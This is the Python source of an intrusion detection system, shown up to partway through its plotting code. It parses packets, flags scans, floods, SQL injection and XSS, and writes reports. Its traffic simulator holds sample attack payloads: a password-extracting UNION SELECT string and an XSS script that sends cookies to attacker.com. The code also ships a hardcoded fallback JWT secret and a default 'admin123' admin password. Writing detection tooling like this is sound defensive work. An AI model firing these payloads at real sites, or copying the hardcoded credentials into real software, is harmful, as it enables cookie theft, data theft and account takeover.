"""
========================================================================================
CyberSentinel — Enterprise Intrusion Detection System (IDS) & Packet Analysis
========================================================================================
Complete Consolidated Project Implementation in Python (.py)
Author: CyberSentinel Security Research Team
Version: 2.5.0 Production Ready

Architecture Overview:
----------------------
1. Database Layer (SQLAlchemy ORM + SQLite): Persistent packet logs, alerts, users, audits
2. Security & Auth: JWT HS256 tokens, PBKDF2/Bcrypt password hashing, Role-Based Access Control
3. GeoIP Intelligence: Real-time geolocation resolution, private IP handling, country profiling
4. Packet Engine: Scapy raw frame parsing, layer extraction (IP/IPv6/TCP/UDP/ICMP/DNS/HTTP/SSH)
5. Rule-Based IDS: Signature & behavioral detection (Port Scan, SYN Flood, SQLi, XSS, Brute Force)
6. Machine Learning Anomaly Detector: Statistical rolling Z-score & Scikit-Learn IsolationForest
7. Offline PCAP Analyzer: Deep packet inspection and forensic artifact extraction from .pcap files
8. Executive PDF Report Generator: ReportLab forensic report with executive metrics and audit tables
9. Real-Time Packet Stream & Capture Engine: Multi-threaded hybrid capture and attack injector
10. Data Visualization: Matplotlib security analytics charts (Protocols, Threats, Talkers)
========================================================================================
"""

import os
import re
import io
import sys
import time
import json
import random
import asyncio
import datetime
import threading
from typing import Dict, Any, List, Optional, Tuple
from collections import deque

# Ensure UTF-8 output encoding for cross-platform terminals (Windows/Linux/Mac)
if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

# Numerical & Machine Learning
import numpy as np
try:
    from sklearn.ensemble import IsolationForest
    HAS_SKLEARN = True
except ImportError:
    HAS_SKLEARN = False

# Visualization
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    HAS_MATPLOTLIB = True
except ImportError:
    HAS_MATPLOTLIB = False

# Network Packet Processing
try:
    from scapy.all import IP, IPv6, TCP, UDP, ICMP, ARP, DNS, Raw, Ether, wrpcap, rdpcap
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

# Database ORM
from sqlalchemy import create_engine, Column, Integer, String, DateTime, Float, Boolean, Text, func
from sqlalchemy.orm import declarative_base, sessionmaker, Session

# Authentication & Cryptography
from passlib.context import CryptContext
from jose import jwt, JWTError

# PDF Generation
try:
    from reportlab.lib.pagesizes import letter
    from reportlab.lib import colors
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    HAS_REPORTLAB = True
except ImportError:
    HAS_REPORTLAB = False

# HTTP Requests for GeoIP
import requests


# ======================================================================================
# SECTION 1: CONFIGURATION & CONSTANTS
# ======================================================================================
SECRET_KEY = os.environ.get("JWT_SECRET", "CYBERSENTINEL_SUPER_SECRET_KEY_2026_PRODUCTION")
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 60 * 24  # 24 Hours
DB_FILENAME = "cybersentinel_ids.db"
DB_URL = f"sqlite:///{DB_FILENAME}"

pwd_context = CryptContext(schemes=["pbkdf2_sha256"], deprecated="auto")


# ======================================================================================
# SECTION 2: DATABASE MODELS & PERSISTENCE (SQLAlchemy)
# ======================================================================================
Base = declarative_base()
engine = create_engine(DB_URL, connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)

def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

class User(Base):
    __tablename__ = "users"
    id = Column(Integer, primary_key=True, index=True)
    username = Column(String, unique=True, index=True, nullable=False)
    hashed_password = Column(String, nullable=False)
    role = Column(String, default="admin") # admin, analyst, viewer
    created_at = Column(DateTime, default=datetime.datetime.utcnow)

class PacketLog(Base):
    __tablename__ = "packet_logs"
    id = Column(Integer, primary_key=True, index=True)
    timestamp = Column(DateTime, default=datetime.datetime.utcnow, index=True)
    source_ip = Column(String, index=True)
    dest_ip = Column(String, index=True)
    source_port = Column(Integer, nullable=True)
    dest_port = Column(Integer, nullable=True)
    protocol = Column(String, index=True)
    length = Column(Integer)
    flags = Column(String, nullable=True)
    info = Column(String, nullable=True)

class Alert(Base):
    __tablename__ = "alerts"
    id = Column(Integer, primary_key=True, index=True)
    timestamp = Column(DateTime, default=datetime.datetime.utcnow, index=True)
    rule_name = Column(String, nullable=False, index=True)
    severity = Column(String, nullable=False)  # CRITICAL, HIGH, MEDIUM, LOW
    source_ip = Column(String, index=True)
    dest_ip = Column(String, index=True)
    source_port = Column(Integer, nullable=True)
    dest_port = Column(Integer, nullable=True)
    protocol = Column(String)
    description = Column(Text)
    payload_snippet = Column(Text, nullable=True)
    acknowledged = Column(Boolean, default=False)
    country = Column(String, default="Unknown")

class AuditLog(Base):
    __tablename__ = "audit_logs"
    id = Column(Integer, primary_key=True, index=True)
    timestamp = Column(DateTime, default=datetime.datetime.utcnow)
    username = Column(String, nullable=False)
    action = Column(String, nullable=False)
    ip_address = Column(String, nullable=True)

# Initialize database schema
Base.metadata.create_all(bind=engine)


# ======================================================================================
# SECTION 3: AUTHENTICATION & SECURITY ENGINE
# ======================================================================================
class SecurityManager:
    """Handles JWT generation, verification, and cryptographic password hashing."""
    @staticmethod
    def verify_password(plain_password: str, hashed_password: str) -> bool:
        return pwd_context.verify(plain_password, hashed_password)

    @staticmethod
    def get_password_hash(password: str) -> str:
        return pwd_context.hash(password)

    @staticmethod
    def create_access_token(data: dict, expires_delta: Optional[datetime.timedelta] = None) -> str:
        to_encode = data.copy()
        expire = datetime.datetime.utcnow() + (expires_delta or datetime.timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES))
        to_encode.update({"exp": expire})
        return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

    @staticmethod
    def decode_token(token: str) -> Optional[dict]:
        try:
            return jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        except JWTError:
            return None

def init_default_admin(db: Session):
    """Ensures at least one administrative credential exists."""
    admin = db.query(User).filter(User.username == "admin").first()
    if not admin:
        hashed = SecurityManager.get_password_hash("admin123")
        db.add(User(username="admin", hashed_password=hashed, role="admin"))
        db.commit()


# ======================================================================================
# SECTION 4: GEOIP INTELLIGENCE ENGINE
# ======================================================================================
GEO_CACHE: Dict[str, Dict[str, Any]] = {}

KNOWN_GEOS = {
    "185.220.101.5": {"country": "Russia", "code": "RU", "city": "Moscow", "flag": "🇷🇺"},
    "45.33.32.156": {"country": "China", "code": "CN", "city": "Beijing", "flag": "🇨🇳"},
    "198.51.100.4": {"country": "United States", "code": "US", "city": "Ashburn", "flag": "🇺🇸"},
    "104.244.42.1": {"country": "Germany", "code": "DE", "city": "Frankfurt", "flag": "🇩🇪"},
    "8.8.8.8": {"country": "United States", "code": "US", "city": "Mountain View", "flag": "🇺🇸"},
    "1.1.1.1": {"country": "Australia", "code": "AU", "city": "Sydney", "flag": "🇦🇺"},
}

def is_private_ip(ip: str) -> bool:
    if not ip or ip in ("Unknown", "localhost", "127.0.0.1", "0.0.0.0"):
        return True
    parts = ip.split(".")
    if len(parts) != 4:
        return False
    try:
        p0, p1 = int(parts[0]), int(parts[1])
        if p0 == 10: return True
        if p0 == 172 and 16 <= p1 <= 31: return True
        if p0 == 192 and p1 == 168: return True
        if p0 == 127: return True
    except ValueError:
        pass
    return False

def get_country_for_ip(ip: str) -> str:
    """Resolves IP to country name with flag emoji and caching."""
    if not ip or ip == "Unknown":
        return "Unknown Region 🌐"
    if is_private_ip(ip):
        return "Internal LAN Host 🖥️"
    if ip in GEO_CACHE:
        return GEO_CACHE[ip]
    if ip in KNOWN_GEOS:
        g = KNOWN_GEOS[ip]
        res = f"{g['country']} {g['flag']}"
        GEO_CACHE[ip] = res
        return res

    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,countryCode", timeout=1.5)
        if r.status_code == 200:
            d = r.json()
            if d.get("status") == "success":
                c = d.get("country", "Unknown")
                res = f"{c} 🌐"
                GEO_CACHE[ip] = res
                return res
    except Exception:
        pass

    fallback = "Remote Host 🌐"
    GEO_CACHE[ip] = fallback
    return fallback


# ======================================================================================
# SECTION 5: PACKET PARSER & NORMALIZATION ENGINE
# ======================================================================================
def parse_raw_packet(pkt_raw: Any) -> Optional[Dict[str, Any]]:
    """
    Parses a Scapy frame or synthetic packet dictionary into a unified schema.
    """
    if isinstance(pkt_raw, dict):
        return pkt_raw

    if not HAS_SCAPY:
        return None

    try:
        now_str = datetime.datetime.utcnow().strftime("%H:%M:%S.%f")[:-3]
        length = len(pkt_raw)
        src_ip, dst_ip = "Unknown", "Unknown"
        src_port, dst_port = None, None
        protocol = "OTHER"
        flags_str = ""
        info = ""
        payload_snippet = ""

        if pkt_raw.haslayer(IP):
            src_ip = pkt_raw[IP].src
            dst_ip = pkt_raw[IP].dst
            protocol = "IP"
        elif pkt_raw.haslayer(IPv6):
            src_ip = pkt_raw[IPv6].src
            dst_ip = pkt_raw[IPv6].dst
            protocol = "IPv6"
        elif pkt_raw.haslayer(ARP):
            src_ip = pkt_raw[ARP].psrc
            dst_ip = pkt_raw[ARP].pdst
            protocol = "ARP"
            info = f"ARP Op:{pkt_raw[ARP].op} ({pkt_raw[ARP].hwsrc} -> {pkt_raw[ARP].hwdst})"

        if pkt_raw.haslayer(TCP):
            protocol = "TCP"
            src_port = pkt_raw[TCP].sport
            dst_port = pkt_raw[TCP].dport
            flags_str = str(pkt_raw[TCP].flags)
            info = f"Seq={pkt_raw[TCP].seq} Ack={pkt_raw[TCP].ack} Flags=[{flags_str}]"
            if dst_port == 80 or src_port == 80: protocol = "HTTP"
            elif dst_port == 443 or src_port == 443: protocol = "HTTPS"
            elif dst_port == 22 or src_port == 22: protocol = "SSH"
        elif pkt_raw.haslayer(UDP):
            protocol = "UDP"
            src_port = pkt_raw[UDP].sport
            dst_port = pkt_raw[UDP].dport
            info = f"UDP Len={pkt_raw[UDP].len}"
            if pkt_raw.haslayer(DNS):
                protocol = "DNS"
                dns = pkt_raw[DNS]
                qname = dns.qd.qname.decode('utf-8', errors='ignore') if dns.qd else ""
                info = f"DNS Query: {qname}"
        elif pkt_raw.haslayer(ICMP):
            protocol = "ICMP"
            info = f"Type={pkt_raw[ICMP].type} Code={pkt_raw[ICMP].code}"

        if pkt_raw.haslayer(Raw):
            try:
                payload_snippet = bytes(pkt_raw[Raw].load)[:120].decode('latin-1', errors='ignore')
            except Exception:
                payload_snippet = "<raw payload>"

        return {
            "timestamp": now_str,
            "source_ip": src_ip,
            "dest_ip": dst_ip,
            "source_port": src_port,
            "dest_port": dst_port,
            "protocol": protocol,
            "length": length,
            "flags": flags_str,
            "info": info,
            "payload_snippet": payload_snippet
        }
    except Exception:
        return None


# ======================================================================================
# SECTION 6: RULE-BASED INTRUSION DETECTION ENGINE
# ======================================================================================
class RuleEngine:
    """
    Signature and Behavioral Pattern Matching Engine:
    - TCP Stealth Scans (NULL, XMAS)
    - Port Scan Detection (probes across multiple ports in a sliding window)
    - SYN Flood DoS (high-rate SYN packets without ACK)
    - SSH / FTP Brute-Force Authentication Traps
    - Ping of Death & ICMP Floods
    - Application Layer Attacks (SQL Injection, Cross-Site Scripting, DNS Tunneling)
    """
    def __init__(self):
        self.port_scan_tracker: Dict[str, Dict[str, Any]] = {}
        self.syn_flood_tracker: Dict[str, Dict[str, Any]] = {}
        self.brute_force_tracker: Dict[str, Dict[str, Any]] = {}
        self.icmp_rate_tracker: Dict[str, Dict[str, Any]] = {}

    def inspect(self, pkt: Dict[str, Any]) -> List[Dict[str, Any]]:
        alerts = []
        now = time.time()
        src_ip = pkt.get("source_ip", "")
        dst_ip = pkt.get("dest_ip", "")
        src_port = pkt.get("source_port")
        dst_port = pkt.get("dest_port")
        protocol = pkt.get("protocol", "")
        flags = pkt.get("flags", "")
        payload = pkt.get("payload_snippet", "")
        length = pkt.get("length", 0)

        # 1. TCP NULL Scan (Zero flags set)
        if protocol == "TCP" and (flags == "" or flags == "0" or flags == "F"):
            alerts.append(self._make_alert("TCP_NULL_SCAN", "HIGH", pkt,
                f"Stealth NULL scan detected from {src_ip} targeting port {dst_port}"))

        # 2. TCP XMAS Scan (FIN + PSH + URG flags set)
        if protocol == "TCP" and ("F" in flags and "P" in flags and "U" in flags):
            alerts.append(self._make_alert("TCP_XMAS_SCAN", "HIGH", pkt,
                f"Stealth XMAS scan (FIN/PSH/URG) probe from {src_ip} on port {dst_port}"))

        # 3. Horizontal & Vertical Port Scan (>7 ports probed in 10s window)
        if src_ip and not is_private_ip(src_ip) and dst_port:
            if src_ip not in self.port_scan_tracker:
                self.port_scan_tracker[src_ip] = {"ports": set(), "last_seen": now}
            tracker = self.port_scan_tracker[src_ip]
            if now - tracker["last_seen"] > 10.0:
                tracker["ports"] = set()
                tracker["last_seen"] = now
            tracker["ports"].add(dst_port)
            if len(tracker["ports"]) >= 7:
                alerts.append(self._make_alert("PORT_SCAN_DETECTED", "CRITICAL", pkt,
                    f"Port scan anomaly: Host {src_ip} scanned {len(tracker['ports'])} ports within 10s"))
                tracker["ports"].clear()

        # 4. SYN Flood DoS (Over 25 SYN packets/sec to target)
        if protocol == "TCP" and "S" in flags and "A" not in flags:
            if dst_ip not in self.syn_flood_tracker:
                self.syn_flood_tracker[dst_ip] = {"count": 0, "start_time": now}
            s_track = self.syn_flood_tracker[dst_ip]
            if now - s_track["start_time"] > 2.0:
                s_track["count"] = 0
                s_track["start_time"] = now
            s_track["count"] += 1
            if s_track["count"] > 25:
                alerts.append(self._make_alert("SYN_FLOOD_DOS", "CRITICAL", pkt,
                    f"SYN Flood DoS attack targeting {dst_ip} ({s_track['count']} SYN pkts in 2s)"))
                s_track["count"] = 0

        # 5. SSH / FTP Brute Force (High frequency hits on port 22/21)
        if dst_port in (22, 21):
            if src_ip not in self.brute_force_tracker:
                self.brute_force_tracker[src_ip] = {"attempts": 0, "start_time": now}
            b_track = self.brute_force_tracker[src_ip]
            if now - b_track["start_time"] > 15.0:
                b_track["attempts"] = 0
                b_track["start_time"] = now
            b_track["attempts"] += 1
            if b_track["attempts"] >= 5:
                srv = "SSH" if dst_port == 22 else "FTP"
                alerts.append(self._make_alert(f"{srv}_BRUTE_FORCE", "HIGH", pkt,
                    f"Repeated {srv} login attempts from {src_ip} ({b_track['attempts']} hits)"))
                b_track["attempts"] = 0

        # 6. ICMP Flood / Ping of Death
        if protocol == "ICMP":
            if length > 1000:
                alerts.append(self._make_alert("PING_OF_DEATH", "HIGH", pkt,
                    f"Oversized ICMP frame ({length} bytes) potential buffer overflow probe"))
            if src_ip not in self.icmp_rate_tracker:
                self.icmp_rate_tracker[src_ip] = {"count": 0, "start_time": now}
            ic_track = self.icmp_rate_tracker[src_ip]
            if now - ic_track["start_time"] > 2.0:
                ic_track["count"] = 0
                ic_track["start_time"] = now
            ic_track["count"] += 1
            if ic_track["count"] > 20:
                alerts.append(self._make_alert("ICMP_FLOOD", "MEDIUM", pkt,
                    f"ICMP flood stream from {src_ip} ({ic_track['count']} requests in 2s)"))
                ic_track["count"] = 0

        # 7. SQL Injection Pattern
        if payload:
            sqli_regexes = [r"UNION\s+SELECT", r"OR\s+1=1", r"DROP\s+TABLE", r"SELECT\s+\*\s+FROM", r"--\s*$"]
            for rg in sqli_regexes:
                if re.search(rg, payload, re.IGNORECASE):
                    alerts.append(self._make_alert("SQL_INJECTION_ATTEMPT", "CRITICAL", pkt,
                        f"SQL Injection attack pattern detected in request from {src_ip}"))
                    break

        # 8. Cross-Site Scripting (XSS) Pattern
        if payload:
            xss_regexes = [r"<script>", r"javascript:", r"onerror\s*=", r"onload\s*="]
            for rg in xss_regexes:
                if re.search(rg, payload, re.IGNORECASE):
                    alerts.append(self._make_alert("XSS_ATTACK_ATTEMPT", "HIGH", pkt,
                        f"Cross-Site Scripting (XSS) payload identified from {src_ip}"))
                    break

        # 9. DNS Tunneling Exfiltration
        if protocol == "DNS" and length > 450:
            alerts.append(self._make_alert("DNS_TUNNELING_EXFIL", "HIGH", pkt,
                f"Abnormally high DNS payload size ({length} bytes) suspected data tunneling"))

        return alerts

    def _make_alert(self, rule_name: str, severity: str, pkt: Dict[str, Any], description: str) -> Dict[str, Any]:
        src_ip = pkt.get("source_ip", "Unknown")
        return {
            "rule_name": rule_name,
            "severity": severity,
            "source_ip": src_ip,
            "dest_ip": pkt.get("dest_ip", "Unknown"),
            "source_port": pkt.get("source_port"),
            "dest_port": pkt.get("dest_port"),
            "protocol": pkt.get("protocol", "OTHER"),
            "description": description,
            "payload_snippet": pkt.get("payload_snippet", "")[:120],
            "country": get_country_for_ip(src_ip),
            "acknowledged": False
        }


# ======================================================================================
# SECTION 7: MACHINE LEARNING & STATISTICAL ANOMALY DETECTOR
# ======================================================================================
class AnomalyDetector:
    """
    Hybrid Anomaly Detection:
    1. Statistical Z-Score deviation over rolling window of packet sizes & intervals.
    2. Scikit-Learn IsolationForest model trained on multivariate network features.
    """
    def __init__(self, window_size: int = 100):
        self.packet_lengths = deque(maxlen=window_size)
        self.packet_intervals = deque(maxlen=window_size)
        self.last_packet_time = time.time()
        self.clf = None
        self.is_trained = False

        if HAS_SKLEARN:
            try:
                self.clf = IsolationForest(n_estimators=50, contamination=0.04, random_state=42)
                # Fit initial baseline on typical distributions
                init_features = np.column_stack([
                    np.random.normal(loc=512, scale=150, size=200).clip(64, 1500),
                    np.random.exponential(scale=0.1, size=200)
                ])
                self.clf.fit(init_features)
                self.is_trained = True
            except Exception:
                self.clf = None

    def inspect(self, pkt: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        now = time.time()
        length = pkt.get("length", 0)
        interval = max(0.001, now - self.last_packet_time)
        self.last_packet_time = now

        self.packet_lengths.append(length)
        self.packet_intervals.append(interval)

        if len(self.packet_lengths) < 25:
            return None

        # 1. Statistical Z-Score
        mean_len = float(np.mean(self.packet_lengths))
        std_len = float(np.std(self.packet_lengths)) + 1e-5
        z_score = (length - mean_len) / std_len

        # 2. Isolation Forest Outlier Prediction
        is_ml_anomaly = False
        if self.is_trained and self.clf is not None:
            try:
                feature_vec = np.array([[length, interval]])
                pred = self.clf.predict(feature_vec)
                if pred[0] == -1: # Outlier detected by IsolationForest
                    is_ml_anomaly = True
            except Exception:
                pass

        if z_score > 4.2 or is_ml_anomaly:
            return {
                "rule_name": "ML_ISOLATION_FOREST_ANOMALY" if is_ml_anomaly else "STATISTICAL_Z_SCORE_ANOMALY",
                "severity": "MEDIUM",
                "source_ip": pkt.get("source_ip", "Unknown"),
                "dest_ip": pkt.get("dest_ip", "Unknown"),
                "source_port": pkt.get("source_port"),
                "dest_port": pkt.get("dest_port"),
                "protocol": pkt.get("protocol", "OTHER"),
                "description": f"Traffic anomaly: length={length}B (Z-Score: {z_score:.2f}, ML Outlier: {is_ml_anomaly})",
                "payload_snippet": pkt.get("payload_snippet", "")[:100],
                "country": get_country_for_ip(pkt.get("source_ip", "Unknown")),
                "acknowledged": False
            }
        return None


# ======================================================================================
# SECTION 8: FORENSIC PCAP FILE ANALYZER
# ======================================================================================
def analyze_pcap(filepath: str) -> Dict[str, Any]:
    """Reads and parses an offline .pcap/.pcapng file, extracting threats and stats."""
    if not HAS_SCAPY:
        return {"error": "Scapy library required for PCAP parsing"}

    if not os.path.exists(filepath):
        return {"error": f"PCAP file {filepath} not found"}

    try:
        packets = rdpcap(filepath)
    except Exception as e:
        return {"error": f"Failed to open PCAP: {str(e)}"}

    rule_eng = RuleEngine()
    anom_eng = AnomalyDetector()

    results = {
        "total_packets": len(packets),
        "protocols": {},
        "top_ips": {},
        "alerts": [],
        "sample_packets": []
    }

    for idx, raw in enumerate(packets):
        parsed = parse_raw_packet(raw)
        if not parsed:
            continue
        parsed["id"] = idx + 1
        proto = parsed.get("protocol", "OTHER")
        results["protocols"][proto] = results["protocols"].get(proto, 0) + 1
        src = parsed.get("source_ip", "Unknown")
        results["top_ips"][src] = results["top_ips"].get(src, 0) + 1

        if len(results["sample_packets"]) < 50:
            results["sample_packets"].append(parsed)

        for a in rule_eng.inspect(parsed):
            results["alerts"].append(a)

        anom = anom_eng.inspect(parsed)
        if anom:
            results["alerts"].append(anom)

    return results


# ======================================================================================
# SECTION 9: EXECUTIVE FORENSIC PDF REPORT GENERATOR
# ======================================================================================
def generate_pdf_report(db: Session, output_filename: str = "cybersentinel_security_report.pdf") -> str:
    """Generates an executive forensic security PDF report using ReportLab."""
    if not HAS_REPORTLAB:
        print("[WARNING] ReportLab is not installed; skipping PDF generation.")
        return ""

    doc = SimpleDocTemplate(
        output_filename,
        pagesize=letter,
        rightMargin=36,
        leftMargin=36,
        topMargin=36,
        bottomMargin=36
    )
    styles = getSampleStyleSheet()

    title_style = ParagraphStyle('DocTitle', parent=styles['Heading1'], fontName='Helvetica-Bold', fontSize=20, leading=24, textColor=colors.HexColor('#0f172a'))
    sub_style = ParagraphStyle('DocSub', parent=styles['Normal'], fontName='Helvetica', fontSize=10, leading=14, textColor=colors.HexColor('#475569'))
    sec_style = ParagraphStyle('DocSec', parent=styles['Heading2'], fontName='Helvetica-Bold', fontSize=13, leading=16, textColor=colors.HexColor('#0284c7'), spaceAfter=6)
    body_style = ParagraphStyle('DocBody', parent=styles['Normal'], fontName='Helvetica', fontSize=9, leading=12, textColor=colors.HexColor('#334155'))

    elements = []
    # Header Banner
    elements.append(Paragraph("🛡️ CyberSentinel — Executive Threat Forensics Digest", title_style))
    elements.append(Paragraph(f"Forensic Timestamp: {datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')} | Automated Intrusion Detection Report", sub_style))
    elements.append(Spacer(1, 10))
    elements.append(HRFlowable(width="100%", thickness=1.5, color=colors.HexColor('#0284c7'), spaceAfter=15))

    # Metrics Summary
    tot_pkts = db.query(PacketLog).count()
    tot_alrts = db.query(Alert).count()
    crit_alrts = db.query(Alert).filter(Alert.severity == "CRITICAL").count()
    high_alrts = db.query(Alert).filter(Alert.severity == "HIGH").count()

    metrics_table = Table([
        [Paragraph("<b>Total Traffic Processed</b>", body_style), Paragraph(f"<b>{tot_pkts:,}</b>", body_style), Paragraph("<b>Critical Threats Flagged</b>", body_style), Paragraph(f"<font color='#dc2626'><b>{crit_alrts}</b></font>", body_style)],
        [Paragraph("<b>Total Incidents Logged</b>", body_style), Paragraph(f"<b>{tot_alrts}</b>", body_style), Paragraph("<b>High / Warning Attacks</b>", body_style), Paragraph(f"<font color='#d97706'><b>{high_alrts}</b></font>", body_style)]
    ], colWidths=[140, 100, 140, 100])
    metrics_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, -1), colors.HexColor('#f8fafc')),
        ('BOX', (0, 0), (-1, -1), 0.5, colors.HexColor('#cbd5e1')),
        ('INNERGRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#e2e8f0')),
        ('PADDING', (0, 0), (-1, -1), 7),
    ]))
    elements.append(Paragraph("Operational Telemetry Overview", sec_style))
    elements.append(metrics_table)
    elements.append(Spacer(1, 15))

    # Attacker Origin Summary
    top_sources = db.query(Alert.source_ip, func.count(Alert.id).label("c")).group_by(Alert.source_ip).order_by(func.count(Alert.id).desc()).limit(5).all()
    elements.append(Paragraph("Top Malicious Origin Hosts (Attacker Profiling)", sec_style))
    top_rows = [["Attacker Source IP", "Country Location", "Incidents Triggered", "Threat Rank"]]
    for idx, (ip, count) in enumerate(top_sources, 1):
        top_rows.append([ip or "Unknown", get_country_for_ip(ip or ""), str(count), f"#{idx}"])
    if len(top_rows) == 1:
        top_rows.append(["No active attack hosts recorded", "-", "0", "-"])

    ip_tbl = Table(top_rows, colWidths=[140, 160, 110, 70])
    ip_tbl.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#0f172a')),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
        ('BOTTOMPADDING', (0, 0), (-1, 0), 5),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#cbd5e1')),
        ('PADDING', (0, 0), (-1, -1), 6),
    ]))
    elements.append(ip_tbl)
    elements.append(Spacer(1, 15))

    # Recent Alerts Table
    elements.append(Paragraph("Recent Critical Incident Logs", sec_style))
    recent = db.query(Alert).order_by(Alert.id.desc()).limit(7).all()
    al_rows = [["Rule Triggered", "Severity", "Attacker IP", "Victim Target", "Incident Description"]]
    for a in recent:
        sev_color = "#dc2626" if a.severity == "CRITICAL" else ("#d97706" if a.severity == "HIGH" else "#2563eb")
        al_rows.append([
            Paragraph(f"<b>{a.rule_name}</b>", body_style),
            Paragraph(f"<font color='{sev_color}'><b>{a.severity}</b></font>", body_style),
            Paragraph(a.source_ip or "Unknown", body_style),
            Paragraph(a.dest_ip or "Unknown", body_style),
            Paragraph(a.description[:60] + "...", body_style)
        ])
    if len(al_rows) == 1:
        al_rows.append(["No incidents recorded", "-", "-", "-", "-"])

    al_tbl = Table(al_rows, colWidths=[120, 60, 100, 100, 100])
    al_tbl.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#1e293b')),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
        ('BOTTOMPADDING', (0, 0), (-1, 0), 5),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#e2e8f0')),
        ('PADDING', (0, 0), (-1, -1), 5),
    ]))
    elements.append(al_tbl)
    elements.append(Spacer(1, 20))

    elements.append(Paragraph("<i>CONFIDENTIAL — CyberSentinel Automated Security Audit Report. Generated for internal forensic analysis.</i>",
        ParagraphStyle('Foot', parent=styles['Normal'], fontSize=7, textColor=colors.HexColor('#94a3b8'), alignment=1)))

    doc.build(elements)
    return output_filename


# ======================================================================================
# SECTION 10: REAL-TIME TRAFFIC SIMULATOR & PACKET ENGINE
# ======================================================================================
class TrafficSimulator:
    """Generates synthetic, realistic network packets and injects attack vectors."""
    PROTOCOLS = ["TCP", "UDP", "HTTP", "HTTPS", "DNS", "ICMP"]
    EXTERNAL_IPS = ["185.220.101.5", "45.33.32.156", "198.51.100.4", "104.244.42.1"]
    INTERNAL_IPS = ["192.168.1.10", "192.168.1.55", "10.0.0.4", "10.0.0.88"]
    TARGET_SERVER = "192.168.1.100"

    @classmethod
    def generate_normal_packet(cls) -> Dict[str, Any]:
        proto = random.choice(cls.PROTOCOLS)
        src = random.choice(cls.INTERNAL_IPS + cls.EXTERNAL_IPS)
        dst = cls.TARGET_SERVER
        sport = random.randint(1024, 65535)
        dport = 80 if proto == "HTTP" else (443 if proto == "HTTPS" else (53 if proto == "DNS" else random.choice([22, 80, 443, 8080])))
        length = random.randint(64, 1460)
        flags = "PA" if proto in ("TCP", "HTTP") else ""
        return {
            "timestamp": datetime.datetime.utcnow().strftime("%H:%M:%S.%f")[:-3],
            "source_ip": src,
            "dest_ip": dst,
            "source_port": sport,
            "dest_port": dport,
            "protocol": proto,
            "length": length,
            "flags": flags,
            "info": f"Standard {proto} Exchange [{sport} -> {dport}]",
            "payload_snippet": f"DATA_STREAM_LEN={length}"
        }

    @classmethod
    def generate_attack_scenario(cls, attack_type: str) -> List[Dict[str, Any]]:
        packets = []
        now_str = datetime.datetime.utcnow().strftime("%H:%M:%S.%f")[:-3]
        if attack_type == "PORT_SCAN":
            src = "185.220.101.5"
            for port in range(20, 30):
                packets.append({
                    "timestamp": now_str,
                    "source_ip": src,
                    "dest_ip": cls.TARGET_SERVER,
                    "source_port": random.randint(40000, 60000),
                    "dest_port": port,
                    "protocol": "TCP",
                    "length": 64,
                    "flags": "S",
                    "info": f"Port Scan probe on port {port}",
                    "payload_snippet": ""
                })
        elif attack_type == "SYN_FLOOD":
            src = "45.33.32.156"
            for _ in range(30):
                packets.append({
                    "timestamp": now_str,
                    "source_ip": src,
                    "dest_ip": cls.TARGET_SERVER,
                    "source_port": random.randint(1024, 65535),
                    "dest_port": 80,
                    "protocol": "TCP",
                    "length": 60,
                    "flags": "S",
                    "info": "SYN Flood Denial of Service stream",
                    "payload_snippet": ""
                })
        elif attack_type == "SQLI":
            packets.append({
                "timestamp": now_str,
                "source_ip": "198.51.100.4",
                "dest_ip": cls.TARGET_SERVER,
                "source_port": 54321,
                "dest_port": 80,
                "protocol": "HTTP",
                "length": 380,
                "flags": "PA",
                "info": "HTTP POST /login",
                "payload_snippet": "username=admin' UNION SELECT 1,password,3 FROM users--&password=xyz"
            })
        elif attack_type == "BRUTE_FORCE":
            src = "104.244.42.1"
            for _ in range(6):
                packets.append({
                    "timestamp": now_str,
                    "source_ip": src,
                    "dest_ip": cls.TARGET_SERVER,
                    "source_port": random.randint(1024, 65535),
                    "dest_port": 22,
                    "protocol": "SSH",
                    "length": 128,
                    "flags": "PA",
                    "info": "SSH Connection Auth Attempt",
                    "payload_snippet": "SSH-2.0-OpenSSH_8.9"
                })
        elif attack_type == "XSS":
            packets.append({
                "timestamp": now_str,
                "source_ip": "198.51.100.4",
                "dest_ip": cls.TARGET_SERVER,
                "source_port": 49152,
                "dest_port": 80,
                "protocol": "HTTP",
                "length": 290,
                "flags": "PA",
                "info": "HTTP GET /search?q=",
                "payload_snippet": "<script>fetch('http://attacker.com/cookie?c='+document.cookie)</script>"
            })
        return packets


# ======================================================================================
# SECTION 11: DATA VISUALIZATION ENGINE (Matplotlib)
# ======================================================================================
def generate_forensic_plots(db: Session, output_image: str = "ids_traffic_analysis.png"):
    """Creates a 4-panel visual security dashboard plot using Matplotlib."""
    if not HAS_MATPLOTLIB:
        print("[WARNING] Matplotlib is not available; skipping graphical plots.")
        return

    # Extract data from DB
    proto_data = db.query(PacketLog.protocol, func.count(PacketLog.id)).group_by(PacketLog.protocol).all()
    proto_labels = [p[0] or "OTHER" for p in proto_data]
